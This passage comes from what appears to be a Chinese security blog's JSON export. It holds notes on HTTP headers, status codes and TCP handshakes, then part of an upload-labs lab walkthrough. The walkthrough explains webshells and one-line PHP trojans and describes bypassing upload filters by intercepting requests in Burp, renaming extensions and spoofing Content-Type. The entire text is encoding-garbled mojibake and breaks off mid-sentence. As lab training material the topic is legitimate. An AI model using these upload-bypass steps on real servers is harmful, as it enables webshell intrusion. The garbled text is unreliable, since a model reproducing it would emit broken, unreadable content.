‡è¯†çš„èµ„æº7ã€TRACEå›æ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¸»è¦ç”¨äºæµ‹è¯•æˆ–è¯Šæ–­8ã€CONNECTHTTP/1.1åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿æ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚ å…³äºURLhttp:\\\\host[:port][abs_path][?query]#fragmentåè®®ï¼šå‘Šè¯‰æµè§ˆå™¨ä½¿ç”¨ä½•ç§åè®®ï¼Œå¸¸ç”¨çš„æ˜¯httpåè®®æˆ–httpsåè®®ä¸»æœºï¼ˆhostï¼‰ï¼šåŸŸåæˆ–ipï¼ŒæŒ‡ç¤ºéœ€è¦å‘ç½‘ç»œä¸Šå“ªä¸€å°å‘èµ·è¯·æ±‚ç«¯å£ï¼ˆportï¼‰ï¼šè¡¨ç¤ºç”¨äºè®¿é—®WEBæœåŠ¡å™¨ä¸Šèµ„æºçš„å…¥å£ï¼Œå¦‚æœè®¿é—®çš„è¯¥ Web æœåŠ¡å™¨ä½¿ç”¨HTTPåè®®çš„æ ‡å‡†ç«¯å£ï¼ˆHTTPä¸º80ï¼ŒHTTPSä¸º443ï¼‰æˆäºˆå¯¹å…¶èµ„æºçš„è®¿é—®æƒé™ï¼Œåˆ™é€šå¸¸çœç•¥æ­¤éƒ¨åˆ†ã€‚è·¯å¾„ï¼ˆabs_pathï¼‰ï¼šwebæœåŠ¡å™¨ä¸Šèµ„æºçš„è·¯å¾„ï¼Œä»¥ç«¯å£åç¬¬ä¸€ä¸ª/å¼€å§‹ï¼Œåˆ°?ç»“æŸæŸ¥è¯¢å‚æ•°ï¼ˆqueryï¼‰ï¼šæä¾›ç»™webæœåŠ¡å™¨çš„é¢å¤–å‚æ•°ï¼Œå¦‚æœä¸ºGETè¯·æ±‚ä¸€èˆ¬URLå¸¦æœ‰æŸ¥è¯¢å‚æ•°é”šç‚¹ï¼ˆfragmentï¼‰ï¼šç»™äºˆæµè§ˆå™¨æ˜¾ç¤ºä½äºè¯¥ç‚¹çš„å†…å®¹çš„æŒ‡ç¤ºï¼Œå…¶ç‰‡æ®µæ ‡è¯†ç¬¦ä¸ä¼šä¸è¯·æ±‚ä¸€èµ·å‘é€åˆ°æœåŠ¡å™¨ è¯·æ±‚å¤´ Hostï¼šè¡¨ç¤ºå¯¹è±¡æ‰€åœ¨ä¸»æœºï¼ŒæŒ‡æ˜äº†æœåŠ¡å™¨çš„åŸŸåï¼Œä»¥åŠï¼ˆå¯é€‰çš„ï¼‰æœåŠ¡å™¨ç›‘å¬çš„TCPç«¯å£å·ã€‚å¦‚æœæ²¡æœ‰ç»™å®šç«¯å£å·ï¼Œä¼šè‡ªåŠ¨ä½¿ç”¨è¢«è¯·æ±‚æœåŠ¡çš„é»˜è®¤ç«¯å£ Connectionï¼š å†³å®šå½“å‰äº‹åŠ¡ï¼ˆä¸€æ¬¡ä¸‰æ¬¡æ¡æ‰‹å’Œå››æ¬¡æŒ¥æ‰‹ï¼‰å®Œæˆåï¼Œæ˜¯å¦ä¼šå…³é—­ç½‘ç»œè¿æ¥ã€‚è‹¥ä¸ºæŒä¹…æ€§è¿æ¥ï¼ˆkeep-aliveï¼‰åˆ™äº‹åŠ¡å®Œæˆåä¸å…³é—­ç½‘ç»œè¿æ¥ï¼Œåä¹‹ä¸ºéæŒä¹…æ€§è¿æ¥ï¼ˆcloseï¼‰ï¼Œä¸€æ¬¡äº‹åŠ¡å®Œæˆåå…³é—­ç½‘ç»œè¿æ¥ã€‚ User-agent: è¯·æ±‚å¤´ç”¨æ¥å‘Šè¯‰ Web æœåŠ¡å™¨ï¼Œæµè§ˆå™¨ä½¿ç”¨çš„ç±»å‹ Dateï¼šè¡¨ç¤ºè¯·æ±‚æ—¶çš„æ ¼æ—å¨æ²»æ—¶é—´ Content-Lengthï¼šå®ä½“æŠ¥å¤´æŒ‡ç¤ºå®ä½“ä¸»ä½“çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ï¼Œå‘é€åˆ°æ¥æ”¶æ–¹ã€‚ HTTP Referer å±æ€§æ˜¯è¯·æ±‚æ ‡å¤´çš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘ web æœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šRefererï¼šå‘Šè¯‰æœåŠ¡å™¨è¯¥ç½‘é¡µæ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨å› æ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç†ã€‚ Upgrade-Insecure-Requestsï¼šç”¨æ¥å‘æœåŠ¡å™¨ç«¯å‘é€ä¿¡å·ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯ä¼˜å…ˆé€‰æ‹©åŠ å¯†åŠå¸¦æœ‰èº«ä»½éªŒè¯çš„å“åº”ã€‚ Acceptï¼šæ¥å—è¯·æ±‚ HTTP æ ‡å¤´ä¼šé€šå‘Šå®¢æˆ·ç«¯å…¶èƒ½å¤Ÿç†è§£çš„ MIME ç±»å‹ã€‚æ–‡æœ¬æ–‡ä»¶ï¼š text/htmlã€text/plainã€text/cssã€application/xhtml+xmlã€application/xmlå›¾ç‰‡æ–‡ä»¶ï¼š image/jpegã€image/gifã€image/pngè§†é¢‘æ–‡ä»¶ï¼š video/mpegã€video/quicktimeåº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ–‡ä»¶ï¼š application/octet-streamã€application/zip çŠ¶æ€ç 2xxï¼šæˆåŠŸå“åº” 200 æˆåŠŸå“åº” 204 è¯·æ±‚å¤„ç†æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰èµ„æºå¯ä»¥è¿”å› 206 å¯¹èµ„æºæŸä¸€éƒ¨åˆ†è¿›è¡Œå“åº”ï¼Œç”±Content-Range æŒ‡å®šèŒƒå›´çš„å®ä½“å†…å®¹ã€‚ 3xxï¼šéœ€è¦è¿›è¡Œé™„åŠ æ“ä½œä»¥å®Œæˆè¯·æ±‚ 301 æ°¸ä¹…æ€§é‡å®šå‘ï¼Œè¯¥çŠ¶æ€ç è¡¨ç¤ºè¯·æ±‚çš„èµ„æºå·²ç»é‡æ–°åˆ†é… URIï¼Œä»¥ååº”è¯¥ä½¿ç”¨èµ„æºç°æœ‰çš„ URI 302 ä¸´æ—¶æ€§é‡å®šå‘ã€‚è¯¥çŠ¶æ€ç è¡¨ç¤ºè¯·æ±‚çš„èµ„æºå·²è¢«åˆ†é…äº†æ–°çš„ URIï¼Œå¸Œæœ›ç”¨æˆ·ï¼ˆæœ¬æ¬¡ï¼‰èƒ½ä½¿ç”¨æ–°çš„ URI è®¿é—®ã€‚ 303 è¯¥çŠ¶æ€ç è¡¨ç¤ºç”±äºè¯·æ±‚å¯¹åº”çš„èµ„æºå­˜åœ¨ç€å¦ä¸€ä¸ª URIï¼Œåº”ä½¿ç”¨ GET æ–¹æ³•å®šå‘è·å–è¯·æ±‚çš„èµ„æºã€‚ 304 è¯¥çŠ¶æ€ç è¡¨ç¤ºå®¢æˆ·ç«¯å‘é€é™„å¸¦æ¡ä»¶çš„è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç«¯å…è®¸è¯·æ±‚è®¿é—®èµ„æºï¼Œä½†æœªæ»¡è¶³æ¡ä»¶çš„æƒ…å†µã€‚ 307 ä¸´æ—¶é‡å®šå‘ã€‚è¯¥çŠ¶æ€ç ä¸ 302 Found æœ‰ç€ç›¸åŒçš„å«ä¹‰ã€‚ 4xxï¼šå®¢æˆ·ç«¯å‘ç”Ÿé”™è¯¯ 400 è¯¥çŠ¶æ€ç è¡¨ç¤ºè¯·æ±‚æŠ¥æ–‡ä¸­å­˜åœ¨è¯­æ³•é”™è¯¯ã€‚å½“é”™è¯¯å‘ç”Ÿæ—¶ï¼Œéœ€ä¿®æ”¹è¯·æ±‚çš„å†…å®¹åå†æ¬¡å‘é€è¯·æ±‚ã€‚ 401 è¯¥çŠ¶æ€ç è¡¨ç¤ºå‘é€çš„è¯·æ±‚éœ€è¦æœ‰é€šè¿‡ HTTP è®¤è¯ï¼ˆBASIC è®¤è¯ã€DIGEST è®¤è¯ï¼‰çš„è®¤è¯ä¿¡æ¯ã€‚ 403 è¯¥çŠ¶æ€ç è¡¨æ˜å¯¹è¯·æ±‚èµ„æºçš„è®¿é—®è¢«æœåŠ¡å™¨æ‹’ç»äº†ã€‚ 404 è¯¥çŠ¶æ€ç è¡¨æ˜æœåŠ¡å™¨ä¸Šæ— æ³•æ‰¾åˆ°è¯·æ±‚çš„èµ„æºã€‚ 5xxï¼šæœåŠ¡å™¨æœ¬èº«å‘ç”Ÿé”™è¯¯ 500 è¯¥çŠ¶æ€ç è¡¨æ˜æœåŠ¡å™¨ç«¯åœ¨æ‰§è¡Œè¯·æ±‚æ—¶å‘ç”Ÿäº†é”™è¯¯ã€‚ 503 è¯¥çŠ¶æ€ç è¡¨æ˜æœåŠ¡å™¨æš‚æ—¶å¤„äºè¶…è´Ÿè½½æˆ–æ­£åœ¨è¿›è¡Œåœæœºç»´æŠ¤ï¼Œç°åœ¨æ— æ³•å¤„ç†è¯·æ±‚ã€‚ å¸¸ç”¨å…¶ä»–åè®®ä»‹ç»DNSè®¡ç®—æœºç½‘ç»œä¸­çš„æ¯ä¸ªç«¯ç³»ç»Ÿéƒ½æœ‰ä¸€ä¸ªIPåœ°å€å­˜åœ¨ï¼Œè€ŒæŠŠIPåœ°å€è½¬æ¢ä¸ºä¾¿äºäººç±»è®°å¿†çš„åè®®å°±æ˜¯ DNS åè®®ã€‚DNS çš„å…¨ç§°æ˜¯åŸŸåç³»ç»Ÿï¼Œå®ƒä½œä¸ºå°†åŸŸåå’Œ IP åœ°å€ç›¸äº’æ˜ å°„çš„ä¸€ä¸ªåˆ†å¸ƒå¼æ•°æ®åº“ï¼Œèƒ½å¤Ÿä½¿äººæ›´æ–¹ä¾¿åœ°è®¿é—®äº’è”ç½‘ã€‚ HTTPSHTTP ä¸€èˆ¬æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œå¾ˆå®¹æ˜“è¢«æ”»å‡»è€…çªƒå–é‡è¦ä¿¡æ¯ï¼Œé‰´äºæ­¤ï¼ŒHTTPS åº”è¿è€Œç”Ÿã€‚HTTPSå’ŒHTTPæœ‰å¾ˆå¤§çš„ä¸åŒåœ¨äºHTTPSæ˜¯ä»¥å®‰å…¨ä¸ºç›®æ ‡çš„HTTPé€šé“ï¼Œåœ¨HTTPçš„åŸºç¡€ä¸Šé€šè¿‡ä¼ è¾“åŠ å¯†å’Œèº«ä»½è®¤è¯ä¿è¯äº†ä¼ è¾“è¿‡ç¨‹çš„å®‰å…¨æ€§ã€‚HTTPSåœ¨HTTPçš„åŸºç¡€ä¸Šå¢åŠ äº†SSLå±‚ï¼Œä¹Ÿå°±æ˜¯è¯´HTTPS = HTTP + SSLã€‚ TCP/IPäº’è”ç½‘è¿›è¡Œé€šä¿¡æ—¶ï¼Œéœ€è¦ç›¸åº”çš„ç½‘ç»œåè®®ï¼ŒTCP/IP åŸæœ¬å°±æ˜¯ä¸ºä½¿ç”¨äº’è”ç½‘è€Œå¼€å‘åˆ¶å®šçš„åè®®æ—ã€‚å› æ­¤ï¼Œäº’è”ç½‘çš„åè®®å°±æ˜¯ TCP/IPï¼ŒTCP/IP å°±æ˜¯äº’è”ç½‘çš„åè®®ã€‚ å…³äºæ•°æ®åŒ…ï¼š é€šä¿¡çš„è¿‡ç¨‹å…¶å®å°±å¯¹åº”ç€æ•°æ®è£…åŒ…ä¸æ‹†åŒ…çš„è¿‡ç¨‹ã€‚è£…åŒ…çš„è¿‡ç¨‹ï¼Œæ•°æ®å‘é€æ–¹æ¯å±‚ä¸æ–­åœ°å°è£…é¦–éƒ¨ï¼Œæ·»åŠ ä¸€äº›ä¿¡æ¯ç”¨äºä¼ è¾“ï¼Œç¡®ä¿èƒ½ä¼ è¾“åˆ°ç›®çš„åœ°ã€‚æ‹†åŒ…çš„è¿‡ç¨‹ï¼Œæ•°æ®æ¥æ”¶æ–¹æ¯å±‚ä¸æ–­åœ°æ‹†é™¤é¦–éƒ¨ï¼Œå¾—åˆ°æœ€ç»ˆä¼ è¾“çš„æ•°æ®ã€‚ ä¸‰æ¬¡æ¡æ‰‹è€Œè¦å»ºç«‹TCP/IPè¿æ¥ï¼Œå°±éœ€è¦ä¸‰æ¬¡æ¡æ‰‹è¿›è¡Œåˆå§‹åŒ–ã€‚ ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªTCPæ ‡å¿—ä½SYN=1ï¼ŒACK=0çš„æ•°æ®åŒ…ç»™æœåŠ¡ç«¯ï¼Œå¹¶éšæœºä¼šäº§ç”Ÿä¸€ä¸ªSeq=J.å½“æœåŠ¡ç«¯æ¥æ”¶åˆ°è¿™ä¸ªæ•°æ®åï¼ŒæœåŠ¡ç«¯ç”±SYN=1å¯çŸ¥å®¢æˆ·ç«¯æ˜¯æƒ³è¦å»ºç«‹è¿æ¥ï¼›ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡ç«¯è¦å¯¹å®¢æˆ·ç«¯çš„è”æœºè¯·æ±‚è¿›è¡Œç¡®è®¤ï¼Œå‘å®¢æˆ·ç«¯å‘é€åº”ç­”å·ACK=1ã€SYN=1ã€ç¡®è®¤å·Ack=J+1ï¼Œæ­¤å€¼æ˜¯å®¢æˆ·ç«¯çš„åºåˆ—å·åŠ 1ï¼Œè¿˜ä¼šäº§ç”Ÿä¸€ä¸ªéšæœºçš„åºåˆ—å·Seq=Kï¼Œè¿™æ ·å°±å‘Šè¯‰å®¢æˆ·ç«¯å¯ä»¥è¿›è¡Œè¿æ¥ï¼›ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ°æ•°æ®åæ£€æŸ¥Ackæ˜¯å¦ä¸ºJ+1ï¼Œä»¥åŠæ ‡å¿—ä½ACKçš„å€¼æ˜¯å¦ä¸º1ï¼Œè‹¥ä¸º1ï¼Œåˆ™ä¼šå‘é€ACK=1ã€ç¡®è®¤å·ç Ack=K+1ï¼Œå‘Šè¯‰æœåŠ¡ç«¯,ä½ çš„è¯·æ±‚è¿æ¥è¢«ç¡®è®¤ï¼Œè¿æ¥å¯ä»¥å»ºç«‹ï¼ŒClientå’ŒServerè¿›å…¥ESTABLISHEDçŠ¶æ€ï¼Œå®Œæˆä¸‰æ¬¡æ¡æ‰‹ï¼ŒéšåClientä¸Serverä¹‹é—´å¯ä»¥å¼€å§‹ä¼ è¾“æ•°æ®äº†ã€‚ ä¸ºäº†é˜²æ­¢å·²å¤±æ•ˆçš„è¿æ¥è¯·æ±‚æŠ¥æ–‡æ®µçªç„¶åˆä¼ é€åˆ°äº†æœåŠ¡ç«¯ï¼Œå› è€Œäº§ç”Ÿé”™è¯¯ä¸‰æ¬¡æ¡æ‰‹æ˜¯åœ¨å®‰å…¨å¯é çš„åŸºç¡€ä¸Šï¼Œæ¡æ‰‹æ¬¡æ•°æœ€å°‘çš„æ–¹æ¡ˆã€‚ä¸¤æ¬¡æ¡æ‰‹å¹¶ä¸èƒ½ä¿è¯å¯é æ€§ï¼Œå››æ¬¡æ¡æ‰‹åˆæµªè´¹äº†æ•ˆç‡ã€‚å½“ç„¶ï¼Œæœ‰çš„éœ€è¦æ›´é«˜å®‰å…¨æ€§çš„åœ°æ–¹ï¼Œæ˜¯å¯ä»¥æœ‰Næ¬¡æ¡æ‰‹åè®®çš„ï¼Œä½†é‚£æ˜¯ç‰¹æ®Šæƒ…å†µã€‚ å››æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹å³ç»ˆæ­¢TCPè¿æ¥ï¼Œå°±æ˜¯æŒ‡æ–­å¼€ä¸€ä¸ªTCPè¿æ¥æ—¶ï¼Œéœ€è¦å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ€»å…±å‘é€4ä¸ªåŒ…ä»¥ç¡®è®¤è¿æ¥çš„æ–­å¼€ã€‚åœ¨socketç¼–ç¨‹ä¸­ï¼Œè¿™ä¸€è¿‡ç¨‹ç”±å®¢æˆ·ç«¯æˆ–æœåŠ¡ç«¯ä»»ä¸€æ–¹æ‰§è¡Œcloseæ¥è§¦å‘ã€‚ ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªFIN=Mï¼Œç”¨æ¥å…³é—­å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨ç«¯çš„æ•°æ®ä¼ é€ï¼Œå®¢æˆ·ç«¯è¿›å…¥FIN_WAIT_1çŠ¶æ€ã€‚æ„æ€æ˜¯è¯´â€æˆ‘å®¢æˆ·ç«¯æ²¡æœ‰æ•°æ®è¦å‘ç»™ä½ äº†â€ï¼Œä½†æ˜¯å¦‚æœä½ æœåŠ¡å™¨ç«¯è¿˜æœ‰æ•°æ®æ²¡æœ‰å‘é€å®Œæˆï¼Œåˆ™ä¸å¿…æ€¥ç€å…³é—­è¿æ¥ï¼Œå¯ä»¥ç»§ç»­å‘é€æ•°æ®ã€‚ç¬¬äºŒæ¬¡æŒ¥æ‰‹ï¼šæœåŠ¡å™¨ç«¯æ”¶åˆ°FINåï¼Œå…ˆå‘é€ack=M+1ï¼Œå‘Šè¯‰å®¢æˆ·ç«¯ï¼Œä½ çš„è¯·æ±‚æˆ‘æ”¶åˆ°äº†ï¼Œä½†æ˜¯æˆ‘è¿˜æ²¡å‡†å¤‡å¥½ï¼Œè¯·ç»§ç»­ä½ ç­‰æˆ‘çš„æ¶ˆæ¯ã€‚è¿™ä¸ªæ—¶å€™å®¢æˆ·ç«¯å°±è¿›å…¥FIN_WAIT_2 çŠ¶æ€ï¼Œç»§ç»­ç­‰å¾…æœåŠ¡å™¨ç«¯çš„FINæŠ¥æ–‡ã€‚ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹ï¼šå½“æœåŠ¡å™¨ç«¯ç¡®å®šæ•°æ®å·²å‘é€å®Œæˆï¼Œåˆ™å‘å®¢æˆ·ç«¯å‘é€FIN=NæŠ¥æ–‡ï¼Œå‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå¥½äº†ï¼Œæˆ‘è¿™è¾¹æ•°æ®å‘å®Œäº†ï¼Œå‡†å¤‡å¥½å…³é—­è¿æ¥äº†ã€‚æœåŠ¡å™¨ç«¯è¿›å…¥LAST_ACKçŠ¶æ€ã€‚ç¬¬å››æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ°FIN=NæŠ¥æ–‡åï¼Œå°±çŸ¥é“å¯ä»¥å…³é—­è¿æ¥äº†ï¼Œä½†æ˜¯ä»–è¿˜æ˜¯ä¸ç›¸ä¿¡ç½‘ç»œï¼Œæ€•æœåŠ¡å™¨ç«¯ä¸çŸ¥é“è¦å…³é—­ï¼Œæ‰€ä»¥å‘é€ack=N+1åè¿›å…¥TIME_WAITçŠ¶æ€ï¼Œå¦‚æœServerç«¯æ²¡æœ‰æ”¶åˆ°ACKåˆ™å¯ä»¥é‡ä¼ ã€‚æœåŠ¡å™¨ç«¯æ”¶åˆ°ACKåï¼Œå°±çŸ¥é“å¯ä»¥æ–­å¼€è¿æ¥äº†ã€‚å®¢æˆ·ç«¯ç­‰å¾…äº†2MSLåä¾ç„¶æ²¡æœ‰æ”¶åˆ°å›å¤ï¼Œåˆ™è¯æ˜æœåŠ¡å™¨ç«¯å·²æ­£å¸¸å…³é—­ï¼Œè¿™æ—¶å®¢æˆ·ç«¯ä¹Ÿå…³é—­è¿æ¥ã€‚æœ€ç»ˆå®Œæˆäº†å››æ¬¡æ¡æ‰‹ã€‚ å…³äºä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æ¡æ‰‹ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡åšå®¢ï¼šè¯¦è§£ TCP è¿æ¥çš„â€œ ä¸‰æ¬¡æ¡æ‰‹ â€ä¸â€œ å››æ¬¡æŒ¥æ‰‹ â€ æ€»ç»“å­¦ä¹ httpåè®®å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ¢ç´¢å¾ˆå¤šæ¼æ´çš„åŸç†ä»¥åŠwebçš„è®¿é—®æ–¹å¼ï¼Œä¸ºæˆ‘ä»¬å­¦ä¹ cookieä¸sessionæ‰“ä¸‹åŸºç¡€ã€‚è€ŒTCP/IPåè®®çš„ä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æ¡æ‰‹æ˜¯ç›¸å½“é‡è¦çš„çŸ¥è¯†ç‚¹ï¼Œéœ€è¦æˆ‘ä»¬è¿›ä¸€æ­¥äº†è§£å­¦ä¹ ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-http -web","slug":"http-web","permalink":"http://example.com/tags/http-web/"}]},{"title":"æ–‡ä»¶ä¸Šä¼ ä¸upload-labs","slug":"æ–‡ä»¶ä¸Šä¼ ä¸upload-labs","date":"2021-11-24T06:34:55.000Z","updated":"2021-11-28T15:36:52.269Z","comments":true,"path":"2021/11/24/æ–‡ä»¶ä¸Šä¼ ä¸upload-labs/","link":"","permalink":"http://example.com/2021/11/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8Eupload-labs/","excerpt":"å‰è¨€æ–‡ä»¶ä¸Šä¼ ä¹Ÿæ˜¯ctfä¸­ç›¸å½“å¸¸è§çš„ä¸€ä¸ªè€ƒç‚¹ï¼Œé€šè¿‡upload-labsçš„å­¦ä¹ æˆ‘ä»¬å¯ä»¥æŒæ¡å„ç§ä¸åŒçš„æ–‡ä»¶ä¸Šä¼ å§¿åŠ¿ã€‚","text":"å‰è¨€æ–‡ä»¶ä¸Šä¼ ä¹Ÿæ˜¯ctfä¸­ç›¸å½“å¸¸è§çš„ä¸€ä¸ªè€ƒç‚¹ï¼Œé€šè¿‡upload-labsçš„å­¦ä¹ æˆ‘ä»¬å¯ä»¥æŒæ¡å„ç§ä¸åŒçš„æ–‡ä»¶ä¸Šä¼ å§¿åŠ¿ã€‚ å…³äºæ–‡ä»¶ä¸Šä¼ æ–‡ä»¶ä¸Šä¼ æ¼æ´å¾€å¾€äº§ç”ŸäºæœåŠ¡å™¨é…ç½®ä¸å½“ï¼Œå¯¼è‡´ä»»æ„æ–‡ä»¶çš„ä¸Šä¼ ï¼Œæˆ–è€…åœ¨å¼€æ”¾æ–‡ä»¶ä¸Šä¼ æ—¶æ²¡æœ‰å¯¹æ–‡ä»¶è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ã€‚å°±ä¼šå¯¼è‡´ä¸æ³•åˆ†å­æ¶æ„å†™å…¥ä¸€äº›webshellï¼Œçªƒå–æœåŠ¡å™¨å†…çš„æ–‡ä»¶ï¼Œé€ æˆä¸¥é‡çš„å±å®³ã€‚ webshellåŠä¸€å¥è¯æœ¨é©¬webshellå°±æ˜¯ä»¥aspã€phpã€jspæˆ–è€…cgiç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§ä»£ç æ‰§è¡Œç¯å¢ƒï¼Œä¸»è¦ç”¨äºç½‘ç«™ç®¡ç†ã€æœåŠ¡å™¨ç®¡ç†ã€æƒé™ç®¡ç†ç­‰æ“ä½œã€‚ä½¿ç”¨æ–¹æ³•ç®€å•ï¼Œåªéœ€ä¸Šä¼ ä¸€ä¸ªä»£ç æ–‡ä»¶ï¼Œé€šè¿‡ç½‘å€è®¿é—®ï¼Œä¾¿å¯è¿›è¡Œå¾ˆå¤šæ—¥å¸¸æ“ä½œï¼Œæå¤§åœ°æ–¹ä¾¿äº†ä½¿ç”¨è€…å¯¹ç½‘ç«™å’ŒæœåŠ¡å™¨çš„ç®¡ç†ã€‚æ­£å› å¦‚æ­¤ï¼Œä¹Ÿæœ‰å°éƒ¨åˆ†äººå°†ä»£ç ä¿®æ”¹åå½“ä½œåé—¨ç¨‹åºä½¿ç”¨ï¼Œä»¥è¾¾åˆ°æ§åˆ¶ç½‘ç«™æœåŠ¡å™¨çš„ç›®çš„ã€‚ è€Œåˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´è¿›è¡Œæ”»å‡»æ—¶æœ€å¸¸ç”¨çš„ä¾¿æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œé€šè¿‡ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶é…åˆèœåˆ€ã€èšå‰‘ç­‰webshellè¿æ¥å·¥å…·ç­‰ï¼Œè·å¾—ç›®æ ‡æœåŠ¡å™¨çš„è¯»å–æƒã€‚ è¿™ç¯‡åšå®¢è¯¦ç»†è®°å½•äº†å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬ï¼Œä¹‹ååšupload-labsé¶åœºä¸€èˆ¬ç”¨åˆ°çš„æ˜¯æ™®é€šphpä¸€å¥è¯æœ¨é©¬ï¼šå¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬ å¯¹äºä¸€å¥è¯æœ¨é©¬ç±»å‹çš„æ–‡ä»¶ä¸Šä¼ ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡åšå®¢å­¦ä¹ ï¼šWebå®‰å…¨-ä¸€å¥è¯æœ¨é©¬ upload-labsåˆ·é¶åœºå»ºè®®å…ˆä»é»‘ç›’å¼€å§‹ï¼Œç­‰åˆ°åšä¸å‡ºæ¥äº†å°±ç¿»æç¤ºå’Œæºç åšç™½ç›’ï¼Œå½“ç„¶ä¸‹é¢æ˜¯ç›´æ¥ä»ç™½ç›’çš„è§’åº¦å†™çš„ã€‚å¦‚æœæ–‡ä»¶åè¢«æ›´æ”¹ï¼Œå¯ä»¥åœ¨Repeaterä¸­Goä¸€ä¸‹ï¼Œå¹¶åœ¨è¿”å›ä¸­æ‰¾åˆ°æ–‡ä»¶åã€‚ Pass-01é¦–å…ˆåœ¨txtæ–‡ä»¶ä¸­å†™å…¥ä¸€å¥è¯ä»£ç ï¼Œä½†phpåç¼€çš„æ–‡ä»¶è¢«è¿‡æ»¤äº†ï¼Œå› æ­¤æˆ‘ä»¬æ”¹åç¼€æ ¼å¼ä¸ºjpgå¹¶ä¸Šä¼ ã€‚ è¿™é¢˜æ¶‰åŠåˆ°äº†JSæ£€æµ‹ï¼Œè¿™é¢˜èµ·è¿‡æ»¤ä½¿ç”¨çš„æ˜¯JSä»£ç ï¼Œè€Œphpä»£ç åœ¨jsä¸­è¢«è¯»å–ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨f12å®¡æŸ¥å…ƒç´ ä¸­åˆ å»JSä»£ç ï¼Œæˆ–è€…ç›´æ¥ç¦ç”¨JSè°ƒç”¨å°±å¯ä»¥ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶äº†ã€‚ ä¸è¿‡ä¸€èˆ¬æˆ‘ä»¬ä½¿ç”¨å¦ä¸€ä¸ªæ–¹æ³•ï¼Œä½¿ç”¨burp suiteæŠ“åŒ…ï¼š åœ¨è“çº¿ä½ç½®æˆ‘ä»¬å‘ç°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œåœ¨è¿™é‡Œå°†jpgåç¼€æ”¹ä¸ºphpå¹¶forwardï¼Œå°±æˆåŠŸä¸Šä¼ äº†æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é¶åœºæ ¹ç›®å½•ä¸­çš„uploadæ–‡ä»¶å¤¹çœ‹åˆ°æˆ‘ä»¬ä¸Šä¼ çš„è¿™ä¸ªæ–‡ä»¶ã€‚ ç”±äºæœ¬åœ°é¶åœºæˆ‘ä»¬çŸ¥é“æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œå› æ­¤ç›´æ¥èšå‰‘è¿æ¥å°±å¯ä»¥äº†ï¼š è®°å¾—åšå®Œä¹‹ååˆ é™¤ä¸Šä¼ çš„æ–‡ä»¶ã€‚ Pass-02è¿™å…³æ¶‰åŠåˆ°çš„æ˜¯MINEï¼Œå³æ–‡ä»¶ç±»å‹ç»•è¿‡ï¼Œæˆ‘ä»¬åŒæ ·æŠ“åŒ…æŸ¥çœ‹ï¼š æˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªContent-Typeï¼Œè¿™é‡Œå°±å¯¹ä½ ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œäº†ä¸€æ¬¡ç±»å‹æ£€æŸ¥ï¼Œå›¾ä¸­ç½‘é¡µæ£€æŸ¥çš„ç±»å‹ä¸ºimage/jpegï¼Œè¿™æ˜¯å› ä¸ºå› ä¸ºæˆ‘ä»¬ä¸Šä¼ çš„æœ¬èº«å°±æ˜¯jpgæ–‡ä»¶ï¼Œå› æ­¤å’Œç¬¬ä¸€å…³ä¸€æ ·æ›´æ”¹åç¼€ä¸ºphpå°±å¯ä»¥äº†ã€‚ ä½†è¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶çš„è¯ï¼Œæˆ‘ä»¬ä¼šå‘ç°è¿™æ¬¡çš„Content-Typeå˜æˆäº†application/octet-streamï¼Œå¯¼è‡´æ£€æŸ¥ä¸é€šè¿‡ï¼Œå› 